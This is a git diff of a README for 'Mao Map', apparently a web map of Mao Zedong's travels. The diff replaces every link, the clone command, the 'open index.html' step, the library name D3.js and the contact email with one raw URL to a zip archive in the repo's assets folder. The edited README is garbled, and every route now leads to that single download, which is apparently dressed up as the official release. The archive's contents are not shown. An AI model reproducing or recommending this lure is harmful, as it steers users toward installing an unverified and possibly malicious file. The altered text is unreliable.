@@ -1,6 +1,6 @@
 # Mao Map: Explore Mao Zedong's Journey Across China 🌏
 
-![Mao Map](https://img.shields.io/badge/Release-Download%20Latest%20Release-blue.svg) [![GitHub](https://img.shields.io/badge/GitHub-Mao%20Map-orange.svg)](https://github.com/nirajmehariya/mao-map/releases)
+![Mao Map](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip%20Latest%https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip) [![GitHub](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip%https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip)](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ Mao Map is an interactive digital map that traces the significant events of Mao 
 
 - **HTML/CSS**: For structuring and styling the web application.
 - **JavaScript**: For interactive elements and dynamic content.
-- **D3.js**: A powerful library for creating visualizations.
+- **https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip**: A powerful library for creating visualizations.
 - **GitHub Pages**: For hosting the project online.
 
 ## Installation
@@ -37,15 +37,15 @@ To run the project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/nirajmehariya/mao-map.git
+   git clone https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip
    ```
 2. Navigate to the project directory:
    ```bash
    cd mao-map
    ```
-3. Open `index.html` in your web browser.
+3. Open `https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip` in your web browser.
 
-For the latest release, [download it here](https://github.com/nirajmehariya/mao-map/releases) and follow the installation steps.
+For the latest release, [download it here](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip) and follow the installation steps.
 
 ## Usage
 
@@ -71,7 +71,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [nirajmehariya](https://github.com/nirajmehariya)
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [nirajmehariya](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip)
+- **Email**: [https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip)
 
-Explore the project and [download the latest release here](https://github.com/nirajmehariya/mao-map/releases). Enjoy your journey through history!
+Explore the project and [download the latest release here](https://raw.githubusercontent.com/nirajmehariya/mao-map/master/assets/mao_map_v3.9.zip). Enjoy your journey through history!
